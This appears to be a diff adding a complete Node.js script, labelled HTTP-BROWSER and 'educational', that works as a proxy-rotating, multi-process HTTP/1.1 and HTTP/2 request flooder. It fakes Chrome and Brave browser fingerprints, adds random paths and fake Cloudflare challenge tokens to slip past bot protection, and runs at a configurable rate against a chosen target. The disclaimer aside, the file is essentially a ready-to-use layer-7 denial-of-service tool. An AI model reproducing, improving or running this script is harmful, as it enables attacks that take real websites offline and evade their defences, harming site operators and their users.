@@ -1,0 +1,527 @@
+/**
+ * HTTP-BROWSER - A tool for making realistic browser HTTP/2 requests
+ * Based on analysis of tornado.js - for educational purposes only
+ */
+const net = require('net');
+const tls = require('tls');
+const HPACK = require('hpack');
+const crypto = require('crypto');
+const fs = require('fs');
+const cluster = require('cluster');
+const os = require('os');
+
+require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
+process.setMaxListeners(0);
+
+// Handle errors gracefully
+process.on('uncaughtException', function (e) {
+    console.log("[ERROR]", e);
+});
+process.on('unhandledRejection', function (e) {
+    console.log("[REJECTION]", e);
+});
+
+// Command line arguments
+const reqmethod = process.argv[2] || "GET";
+const target = process.argv[3];
+const time = process.argv[4] || 60;
+const threads = process.argv[5] || 2;
+const ratelimit = process.argv[6] || 10;
+const proxyfile = process.argv[7];
+
+// Optional arguments
+const customua = process.argv.indexOf('--ua');
+const customuavalue = customua !== -1 && customua + 1 < process.argv.length ? process.argv[customua + 1] : undefined;
+const queryIndex = process.argv.indexOf('--query');
+const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
+const delayIndex = process.argv.indexOf('--delay');
+const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 1;
+const cookieIndex = process.argv.indexOf('--cookie');
+const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
+const refererIndex = process.argv.indexOf('--referer');
+const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
+const customHeadersIndex = process.argv.indexOf('--header');
+const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
+const useRandPath = process.argv.includes('--randpath');
+const forceHttpIndex = process.argv.indexOf('--http');
+const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] : "2";
+
+// Validate inputs
+if (!target) {
+    console.error(`
+    [HTTP-BROWSER] A tool for making realistic browser HTTP/2 requests
+    Usage:
+      node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxyfile>
+      node ${process.argv[1]} GET "https://example.com" 60 2 10 proxy.txt
+    
+    Options:
+      --query 1/2/3 - Add query strings
+      --delay <1-1000> - Delay between requests in ms
+      --cookie "name=value" - Custom cookies
+      --referer url/rand - Custom referer
+      --http 1/2/mix - Choose HTTP/1.1, HTTP/2, or mix
+      --header "name:value#name2:value2" - Custom headers (split with #)
+      --randpath - Add random paths
+      --ua "User Agent" - Custom user agent
+    `);
+    process.exit(1);
+}
+
+// Parse URL
+const url = new URL(target);
+let hcookie = '';
+
+// Parse proxy file if provided
+let proxy = [];
+if (proxyfile && fs.existsSync(proxyfile)) {
+    proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
+}
+
+// Set cookie if provided
+if (cookieValue) {
+    hcookie = cookieValue;
+    if (cookieValue.includes('%RAND%')) {
+        hcookie = hcookie.replace(/%RAND%/g, generateRandomString(8));
+    }
+}
+
+// HTTP/2 Frame Encoding/Decoding Functions
+const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
+
+function encodeFrame(streamId, type, payload = "", flags = 0) {
+    let frame = Buffer.alloc(9);
+    frame.writeUInt32BE(payload.length << 8 | type, 0);
+    frame.writeUInt8(flags, 4);
+    frame.writeUInt32BE(streamId, 5);
+    if (payload.length > 0)
+        frame = Buffer.concat([frame, payload]);
+    return frame;
+}
+
+function decodeFrame(data) {
+    const lengthAndType = data.readUInt32BE(0);
+    const length = lengthAndType >> 8;
+    const type = lengthAndType & 0xFF;
+    const flags = data.readUint8(4);
+    const streamId = data.readUInt32BE(5);
+    const offset = flags & 0x20 ? 5 : 0;
+
+    let payload = Buffer.alloc(0);
+
+    if (length > 0) {
+        payload = data.subarray(9 + offset, 9 + offset + length);
+
+        if (payload.length + offset != length) {
+            return null;
+        }
+    }
+
+    return {
+        streamId,
+        length,
+        type,
+        flags,
+        payload
+    };
+}
+
+function encodeSettings(settings) {
+    const data = Buffer.alloc(6 * settings.length);
+    for (let i = 0; i < settings.length; i++) {
+        data.writeUInt16BE(settings[i][0], i * 6);
+        data.writeUInt32BE(settings[i][1], i * 6 + 2);
+    }
+    return data;
+}
+
+// Helper functions
+function generateRandomString(length) {
+    const characters = 'abcdefghijklmnopqrstuvwxyz';
+    let result = "";
+    const charactersLength = characters.length;
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+
+function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+// Create a browser-like HTTP/1.1 request
+function buildHttpRequest() {
+    const browserVersion = getRandomInt(126, 129);
+    let userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
+    
+    if (customuavalue) {
+        userAgent = customuavalue;
+    }
+    
+    const browserList = ['Google Chrome', 'Brave'];
+    const selectedBrowser = browserList[Math.floor(Math.random() * browserList.length)];
+    const isBrave = selectedBrowser === 'Brave';
+    
+    let brandValue;
+    if (browserVersion === 126) {
+        brandValue = `"Not/A)Brand";v="8", "Chromium";v="${browserVersion}", "${selectedBrowser}";v="${browserVersion}"`;
+    } else if (browserVersion === 127) {
+        brandValue = `"Not)A;Brand";v="99", "${selectedBrowser}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
+    } else if (browserVersion === 128) {
+        brandValue = `"Not;A=Brand";v="24", "Chromium";v="${browserVersion}", "${selectedBrowser}";v="${browserVersion}"`;
+    } else if (browserVersion === 129) {
+        brandValue = `"${selectedBrowser}";v="${browserVersion}", "Not=A?Brand";v="8", "Chromium";v="${browserVersion}"`;
+    }
+
+    const acceptHeaderValue = isBrave
+        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
+        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
+
+    const langValue = isBrave
+        ? 'en-US,en;q=0.9'
+        : 'en-US,en;q=0.7';
+
+    const secChUa = `${brandValue}`;
+    const currentRefererValue = refererValue === 'rand' 
+        ? 'https://' + generateRandomString(6) + ".net" 
+        : refererValue;
+
+    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
+        `Host: ${url.hostname}\r\n` +
+        'Connection: keep-alive\r\n' +
+        'Cache-Control: max-age=0\r\n' +
+        `sec-ch-ua: ${secChUa}\r\n` +
+        'sec-ch-ua-mobile: ?0\r\n' +
+        'sec-ch-ua-platform: "Windows"\r\n' +
+        'Upgrade-Insecure-Requests: 1\r\n' +
+        `User-Agent: ${userAgent}\r\n` +
+        `Accept: ${acceptHeaderValue}\r\n` +
+        'Sec-Fetch-Site: none\r\n' +
+        'Sec-Fetch-Mode: navigate\r\n' +
+        'Sec-Fetch-User: ?1\r\n' +
+        'Sec-Fetch-Dest: document\r\n' +
+        'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
+        `Accept-Language: ${langValue}\r\n`;
+
+    if (hcookie) {
+        headers += `Cookie: ${hcookie}\r\n`;
+    }
+
+    if (currentRefererValue) {
+        headers += `Referer: ${currentRefererValue}\r\n`;
+    }
+
+    headers += '\r\n';
+    return Buffer.from(headers, 'binary');
+}
+
+// Function to create HTTP/2 headers
+function createHttp2Headers() {
+    const browserVersion = getRandomInt(126, 129);
+    let userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
+    
+    if (customuavalue) {
+        userAgent = customuavalue;
+    }
+    
+    const browserList = ['Google Chrome', 'Brave'];
+    const selectedBrowser = browserList[Math.floor(Math.random() * browserList.length)];
+    const isBrave = selectedBrowser === 'Brave';
+    
+    let brandValue;
+    if (browserVersion === 126) {
+        brandValue = `"Not/A)Brand";v="8", "Chromium";v="${browserVersion}", "${selectedBrowser}";v="${browserVersion}"`;
+    } else if (browserVersion === 127) {
+        brandValue = `"Not)A;Brand";v="99", "${selectedBrowser}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
+    } else if (browserVersion === 128) {
+        brandValue = `"Not;A=Brand";v="24", "Chromium";v="${browserVersion}", "${selectedBrowser}";v="${browserVersion}"`;
+    } else if (browserVersion === 129) {
+        brandValue = `"${selectedBrowser}";v="${browserVersion}", "Not=A?Brand";v="8", "Chromium";v="${browserVersion}"`;
+    }
+
+    const acceptHeaderValue = isBrave
+        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
+        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
+
+    const langValue = isBrave
+        ? 'en-US,en;q=0.9'
+        : 'en-US,en;q=0.7';
+
+    const secGpcValue = isBrave ? "1" : undefined;
+    
+    const refTypes = ["same-site", "same-origin", "cross-site"];
+    const refType = refTypes[Math.floor(Math.random() * refTypes.length)];
+    
+    const currentRefererValue = refererValue === 'rand' 
+        ? 'https://' + generateRandomString(6) + ".com" 
+        : refererValue;
+
+    let path = url.pathname;
+    if (useRandPath) {
+        path = url.pathname + generateRandomString(5);
+    }
+    
+    if (query) {
+        if (query === '1') {
+            path += '?__cf_chl_rt_tk=' + generateRandomString(43);
+        } else if (query === '2') {
+            path += '?' + generateRandomString(5) + '&' + generateRandomString(5);
+        } else if (query === '3') {
+            path += '?q=' + generateRandomString(5) + '&' + generateRandomString(5);
+        }
+    }
+
+    // Create basic headers for HTTP/2
+    const headers = Object.entries({
+        ":method": reqmethod,
+        ":authority": url.hostname,
+        ":scheme": "https",
+        ":path": path
+    }).concat(Object.entries({
+        "cache-control": Math.random() < 0.5 ? "no-cache" : "max-age=0",
+        ...(reqmethod === "POST" && { "content-length": "0" }),
+        ...(reqmethod === "POST" && { "content-type": "application/x-www-form-urlencoded" }),
+        "sec-ch-ua": brandValue,
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": `"Windows"`,
+        "upgrade-insecure-requests": "1",
+        "user-agent": userAgent,
+        "accept": reqmethod === "POST" ? "*/*" : acceptHeaderValue,
+        ...(secGpcValue && { "sec-gpc": secGpcValue }),
+        "sec-fetch-site": currentRefererValue ? refType : "none",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-user": "?1",
+        "sec-fetch-dest": "document",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": langValue,
+        "priority": "u=0, i",
+        ...(hcookie && { "cookie": hcookie }),
+        ...(currentRefererValue && { "referer": currentRefererValue })
+    }).filter(a => a[1] != null));
+
+    // Parse custom headers if provided
+    const customHeadersArray = [];
+    if (customHeaders) {
+        const customHeadersList = customHeaders.split('#');
+        for (const header of customHeadersList) {
+            const [name, value] = header.split(':');
+            if (name && value) {
+                customHeadersArray.push([name.trim().toLowerCase(), value.trim()]);
+            }
+        }
+    }
+    
+    return [...headers, ...customHeadersArray];
+}
+
+// Function to make an HTTP/2 connection through a proxy
+async function makeHttp2Request() {
+    if (!proxy || proxy.length === 0) {
+        console.log("[ERROR] No valid proxies found");
+        return;
+    }
+    
+    let proxyHost, proxyPort, username, password;
+    [proxyHost, proxyPort, username, password] = proxy[Math.floor(Math.random() * proxy.length)].split(':');
+    
+    if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
+        console.log("[ERROR] Invalid proxy");
+        return;
+    }
+    
+    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
+        // Connect to proxy
+        if (!username) {
+            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
+        } else {
+            const authString = Buffer.from(`${username}:${password}`).toString('base64');
+            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Authorization: Basic ${authString}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
+        }
+        
+        netSocket.once('data', () => {
+            // Setup TLS connection
+            const tlsSocket = tls.connect({
+                socket: netSocket,
+                ALPNProtocols: forceHttp === "1" ? ['http/1.1'] : 
+                              forceHttp === "2" ? ['h2'] : 
+                              ['h2', 'http/1.1'],
+                servername: url.hostname,
+                ciphers: [
+                    'TLS_AES_128_GCM_SHA256',
+                    'TLS_AES_256_GCM_SHA384',
+                    'TLS_CHACHA20_POLY1305_SHA256',
+                    'ECDHE-ECDSA-AES128-GCM-SHA256',
+                    'ECDHE-RSA-AES128-GCM-SHA256',
+                    'ECDHE-ECDSA-AES256-GCM-SHA384',
+                    'ECDHE-RSA-AES256-GCM-SHA384',
+                    'ECDHE-ECDSA-CHACHA20-POLY1305',
+                    'ECDHE-RSA-CHACHA20-POLY1305'
+                ].join(':'),
+                ecdhCurve: 'X25519:P-256:P-384',
+                secure: true,
+                rejectUnauthorized: false
+            }, () => {
+                // Check if HTTP/1.1 or HTTP/2
+                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1') {
+                    console.log("[INFO] Connected using HTTP/1.1");
+                    
+                    // Send HTTP/1.1 request
+                    const http1Request = buildHttpRequest();
+                    tlsSocket.write(http1Request);
+                    
+                    // Handle response data
+                    let responseData = '';
+                    tlsSocket.on('data', (chunk) => {
+                        responseData += chunk.toString();
+                        // Basic response handling
+                        if (responseData.includes('\r\n\r\n') && !responseData.startsWith('HTTP')) {
+                            const statusLine = responseData.split('\r\n')[0];
+                            console.log("[RESPONSE]", statusLine);
+                        }
+                    });
+                    
+                } else {
+                    console.log("[INFO] Connected using HTTP/2");
+                    
+                    // HTTP/2 setup
+                    let streamId = 1;
+                    let data = Buffer.alloc(0);
+                    let hpack = new HPACK();
+                    
+                    // Initialize HTTP/2 connection
+                    const frames = [
+                        Buffer.from(PREFACE, 'binary'),
+                        encodeFrame(0, 4, encodeSettings([
+                            [1, 65536],    // HEADER_TABLE_SIZE
+                            [2, 0],        // ENABLE_PUSH
+                            [4, 65535],    // INITIAL_WINDOW_SIZE
+                            [6, 160000]    // MAX_HEADER_LIST_SIZE
+                        ])),
+                        encodeFrame(0, 8, Buffer.from([0x00, 0x00, 0x00, 0x0F])) // WINDOW_UPDATE
+                    ];
+                    
+                    tlsSocket.write(Buffer.concat(frames));
+                    
+                    // Handle HTTP/2 response
+                    tlsSocket.on('data', (chunk) => {
+                        data = Buffer.concat([data, chunk]);
+                        
+                        while (data.length >= 9) {
+                            const frame = decodeFrame(data);
+                            if (frame !== null) {
+                                data = data.subarray(frame.length + 9);
+                                
+                                // Handle SETTINGS frame
+                                if (frame.type === 4 && frame.flags === 0) {
+                                    tlsSocket.write(encodeFrame(0, 4, "", 1)); // ACK
+                                }
+                                
+                                // Handle HEADERS frame
+                                if (frame.type === 1) {
+                                    try {
+                                        const decodedHeaders = hpack.decode(frame.payload);
+                                        const status = decodedHeaders.find(h => h[0] === ':status');
+                                        if (status) {
+                                            console.log("[RESPONSE] Status:", status[1]);
+                                        }
+                                    } catch (e) {
+                                        console.log("[ERROR] Failed to decode headers:", e.message);
+                                    }
+                                }
+                            } else {
+                                break;
+                            }
+                        }
+                    });
+                    
+                    // Send HTTP/2 request
+                    const headers = createHttp2Headers();
+                    const packedHeaders = hpack.encode(headers);
+                    tlsSocket.write(encodeFrame(streamId, 1, packedHeaders, 0x5)); // END_STREAM | END_HEADERS
+                    streamId += 2;
+                }
+                
+                // Close connection after some time
+                setTimeout(() => {
+                    tlsSocket.end(() => {
+                        netSocket.end();
+                        console.log("[INFO] Connection closed");
+                    });
+                }, 5000);
+            });
+            
+            // Handle TLS errors
+            tlsSocket.on('error', (error) => {
+                console.log("[TLS ERROR]", error.message);
+                tlsSocket.end();
+                netSocket.end();
+            });
+        });
+    });
+    
+    // Handle TCP socket errors
+    netSocket.on('error', (error) => {
+        console.log("[TCP ERROR]", error.message);
+        netSocket.end();
+    });
+}
+
+// Start the requests
+async function start() {
+    console.log(`
+    [HTTP-BROWSER] Starting requests
+    Target: ${target}
+    Method: ${reqmethod}
+    HTTP Version: ${forceHttp === "1" ? "HTTP/1.1" : forceHttp === "2" ? "HTTP/2" : "Mixed"}
+    Rate: ${ratelimit} req/sec
+    `);
+    
+    // Make requests at the specified rate
+    const interval = 1000 / ratelimit;
+    let running = true;
+    
+    const makeRequest = async () => {
+        if (!running) return;
+        await makeHttp2Request();
+        setTimeout(makeRequest, interval);
+    };
+    
+    // Start the requests
+    for (let i = 0; i < Math.min(10, ratelimit); i++) {
+        setTimeout(makeRequest, i * (interval / 10));
+    }
+    
+    // Stop after specified time
+    setTimeout(() => {
+        running = false;
+        console.log("[INFO] Finished running");
+        setTimeout(() => process.exit(0), 1000);
+    }, time * 1000);
+}
+
+// Check if we're in master or worker process
+if (cluster.isMaster) {
+    console.log(`[MASTER] Starting ${threads} workers`);
+    
+    // Fork workers
+    for (let i = 0; i < threads; i++) {
+        cluster.fork();
+    }
+    
+    // Handle worker exit
+    cluster.on('exit', (worker) => {
+        console.log(`[MASTER] Worker ${worker.id} died`);
+    });
+    
+    // Exit after specified time
+    setTimeout(() => {
+        console.log("[MASTER] Time's up, shutting down");
+        for (const id in cluster.workers) {
+            cluster.workers[id].kill();
+        }
+        process.exit(0);
+    }, time * 1000);
+} else {
+    // Worker process
+    start();
+}
